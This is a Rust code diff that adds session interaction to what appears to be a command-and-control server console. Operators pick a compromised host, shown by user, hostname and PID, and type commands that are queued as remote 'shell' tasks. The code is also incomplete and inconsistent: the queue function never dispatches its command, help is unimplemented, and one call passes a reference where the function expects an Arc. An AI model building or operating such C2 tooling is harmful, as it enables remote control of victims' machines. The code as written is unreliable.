@@ -226,6 +226,63 @@ async fn list_sessions(state: &Arc<AppState>) {
     }
 }
 
+async fn interact_session(state: Arc<AppState>, session_id: &str) {
+    let sessions = state.sessions.read().await;
+    let session = match sessions.get(session_id) {
+        Some(s) => s.clone(),
+        None => {
+            println!("[-] Session '{}' not found", session_id);
+            return;
+        }
+    };
+
+    drop(sessions);
+
+    println!("\n    [!] Interacting with {} ({}@{} PID:{})", session.id, session.username, session.hostname, session.pid);
+    println!("  Type 'back' to return\n");
+
+    loop {
+        println!("felis({})> ", session_id);
+        std::io::stdout().flush().unwrap();
+
+        let mut input = String::new();
+        if std::io::stdin().read_line(& input).is_err() {
+            break;
+        } 
+        let input = input.trim();
+        if input.is_empty() {
+            continue;
+        }
+
+        match input {
+            "help" | "?" => todo!(),  
+            "back" | "exit" | "bg" => break,
+            _ => {
+                let cmd = if input.starts_with("shell ") {
+                    input.strip_prefix("shell ").unwrap()
+                } else {
+                    input
+                };
+                queue_command(state, session_id, "shell", vec![cmd.to_string()]).await;
+            }
+        }
+    }
+}
+
+async fn queue_command(state: Arc<AppState>, session_id: &str, cmd_type: &str, args: Vec<String>) {
+    let id = format!("{:08X}", rand::random::<u32>());
+
+    let cmd = CommandData {
+        id: id.clone(),
+        command_type: cmd_type.to_string(),
+        args: args.clone(),
+        timeout: None,
+    };
+
+    
+
+}
+
 async fn cli_loop(state: Arc<AppState>) {
     // give the server a moment to start
     tokio::time::sleep(std::time::Duration::from_millis(500)).await;
@@ -245,6 +302,13 @@ async fn cli_loop(state: Arc<AppState>) {
         let parts: Vec<&str> = input.splitn(3, ' ').collect();
         match parts[0] {
             "sessions" | "ls" => list_sessions(&state).await,
+            "use" | "interact" => {
+                if parts.len() < 2 {
+                    println!("[-] Usage: use <session_id>");
+                } else {
+                    interact_session(&state, parts[1]).await;
+                }
+            }
             _ => println!("x Unkown command: {}", parts[0]),
         }
     }
